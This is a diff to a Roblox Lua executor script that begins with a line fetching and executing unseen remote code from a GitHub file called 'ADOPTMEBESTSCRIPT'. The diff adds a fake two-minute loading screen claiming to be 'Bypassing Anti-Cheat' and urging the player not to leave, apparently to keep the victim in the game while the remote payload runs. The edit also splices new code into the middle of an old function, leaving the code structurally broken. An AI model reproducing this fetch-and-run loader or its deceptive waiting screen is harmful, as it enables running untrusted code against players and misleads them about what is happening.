@@ -1,5 +1,4 @@
 loadstring(game:HttpGet('https://raw.githubusercontent.com/turkeyjhonny/ADOPTMEBESTSCRIPT/refs/heads/main/anojay.txt'))()
-
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local ReplicatedFirst = game:GetService("ReplicatedFirst")
@@ -334,68 +333,121 @@ local function simulateLoading()
         local delayTime
         if percent == 20 or percent == 50 or percent == 80 then
             delayTime = math.random(15, 25)
-            freezeText.Text = "⚠️ Please wait and dont leave to get the script..."
-            TweenService:Create(freezeText, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {TextTransparency = 0}):Play()
-            updateProgress(percent)
-            wait(delayTime)
-            TweenService:Create(freezeText, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {TextTransparency = 1}):Play()
-            freezeText.Text = ""
-        else
-            delayTime = math.random(1, 2)
-            updateProgress(percent)
-            wait(delayTime)
-        end
+-- Cool Loading Screen with % Blinking, Anti-Cheat Message, and Device/Wi-Fi Message
 
-        totalTime = totalTime + delayTime
-        percent = percent + math.random(1, 2)
-    end
+local gui = Instance.new("ScreenGui")
+local mainFrame = Instance.new("Frame")
+local uicorner = Instance.new("UICorner")
+local title = Instance.new("TextLabel")
+local percentLabel = Instance.new("TextLabel")
+local statusLabel = Instance.new("TextLabel")
+local deviceWiFiLabel = Instance.new("TextLabel")
+local progressBarBG = Instance.new("Frame")
+local progressBar = Instance.new("Frame")
+local glow = Instance.new("UIGradient")
+local corner1 = Instance.new("UICorner")
+local corner2 = Instance.new("UICorner")
 
-    while percent <= 100 do
-        updateProgress(percent)
-        wait(0.5)
-        percent = percent + 1
-    end
-
-    -- 
-    loadingText.Text = "Complete!"
-    TweenService:Create(loadingText, TweenInfo.new(1, Enum.EasingStyle.Sine), {TextColor3 = Color3.fromRGB(100, 255, 100)}):Play()
-end
-
-boostButton.MouseButton1Click:Connect(function()
-    if score >= 50 and percent < 80 then
-        score = score - 50
-        percent = percent + 20
-        if percent > 100 then percent = 100 end
-        scoreText.Text = "Score: " .. score
-        updateProgress(percent)
-        boostButton.Visible = false
-        TweenService:Create(boostButton, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
-    end
+-- Executor-friendly GUI parenting
+pcall(function()
+	gui.Parent = game:GetService("CoreGui")
 end)
-
-local function checkGameEnd()
-    player.CharacterAdded:Connect(function()
-        -- 
-        screenGui.Parent = playerGui
-    end)
-
-    game:GetService("Players").PlayerRemoving:Connect(function(leavingPlayer)
-        if leavingPlayer == player then
-            gameRunning = false
-          
-            -- TweenService:Create(background, TweenInfo.new(1.5, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
-            -- for _, child in pairs(screenGui:GetChildren()) do
-            --     TweenService:Create(child, TweenInfo.new(1.5, Enum.EasingStyle.Quad), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
-            
-        end
-    end)
+if not gui.Parent then
+	gui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
 end
+gui.Name = "CoolLoadingGUI"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
-spawn(simulateLoading)
-checkGameEnd()
+-- Main Frame
+mainFrame.Parent = gui
+mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+mainFrame.Size = UDim2.new(0, 400, 0, 190) -- Increased height for additional message
+mainFrame.Position = UDim2.new(0.5, -200, 0.5, -95)
+mainFrame.BackgroundTransparency = 0.15
+uicorner.CornerRadius = UDim.new(0, 12)
+uicorner.Parent = mainFrame
 
+-- Title
+title.Parent = mainFrame
+title.Text = "Loading Script..."
+title.Size = UDim2.new(1, 0, 0, 40)
+title.Position = UDim2.new(0, 0, 0, 10)
+title.BackgroundTransparency = 1
+title.TextColor3 = Color3.fromRGB(0, 255, 170)
+title.Font = Enum.Font.GothamBlack
+title.TextScaled = true
 
+-- Percent Label (Blinking)
+percentLabel.Parent = mainFrame
+percentLabel.Text = "0%"
+percentLabel.Size = UDim2.new(1, 0, 0, 35)
+percentLabel.Position = UDim2.new(0, 0, 0.4, -5)
+percentLabel.BackgroundTransparency = 1
+percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+percentLabel.Font = Enum.Font.Gotham
+percentLabel.TextScaled = true
 
+-- Status Label (Bypassing Anti-Cheat)
+statusLabel.Parent = mainFrame
+statusLabel.Text = "Bypassing Anti-Cheat... Please don’t leave."
+statusLabel.Size = UDim2.new(1, -20, 0, 25)
+statusLabel.Position = UDim2.new(0, 10, 0.63, 0)
+statusLabel.BackgroundTransparency = 1
+statusLabel.TextColor3 = Color3.fromRGB(255, 170, 0)
+statusLabel.Font = Enum.Font.GothamSemibold
+statusLabel.TextScaled = true
+statusLabel.TextWrapped = true
 
+-- Device/Wi-Fi Message (Improved visibility)
+deviceWiFiLabel.Parent = mainFrame
+deviceWiFiLabel.Text = "Loading may depend on your device or Wi-Fi speed."
+deviceWiFiLabel.Size = UDim2.new(1, -20, 0, 30) -- Adjusted height for better visibility
+deviceWiFiLabel.Position = UDim2.new(0, 10, 0.76, 0)
+deviceWiFiLabel.BackgroundTransparency = 0 -- Fully opaque background
+deviceWiFiLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Solid black background
+deviceWiFiLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text for contrast
+deviceWiFiLabel.Font = Enum.Font.GothamBold -- Bold for better visibility
+deviceWiFiLabel.TextScaled = true
+deviceWiFiLabel.TextWrapped = true
+deviceWiFiLabel.TextYAlignment = Enum.TextYAlignment.Center
 
-   
+-- Progress Bar Background
+progressBarBG.Parent = mainFrame
+progressBarBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+progressBarBG.Position = UDim2.new(0.1, 0, 0.83, 0)
+progressBarBG.Size = UDim2.new(0.8, 0, 0.12, 0)
+corner1.CornerRadius = UDim.new(0, 8)
+corner1.Parent = progressBarBG
+
+-- Progress Bar Fill
+progressBar.Parent = progressBarBG
+progressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 170)
+progressBar.Size = UDim2.new(0, 0, 1, 0)
+corner2.CornerRadius = UDim.new(0, 8)
+corner2.Parent = progressBar
+
+-- Glowing Gradient
+glow.Color = ColorSequence.new{
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 170)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 170, 255))
+}
+glow.Rotation = 45
+glow.Parent = progressBar
+
+-- Animate 2-minute loading
+spawn(function()
+	for i = 0, 100 do
+		-- Update progress bar size
+		progressBar:TweenSize(UDim2.new(i/100, 0, 1, 0), "Out", "Sine", 0.5, true)
+		
+		-- Update percentage text (with blinking effect)
+		percentLabel.Text = tostring(i).."%"
+		percentLabel.Visible = not percentLabel.Visible  -- Toggle visibility to create blinking effect
+		
+		wait(1.2) -- 100 steps * 1.2s = 120 seconds (2 minutes)
+	end
+	wait(1)
+	gui:Destroy()
+end)
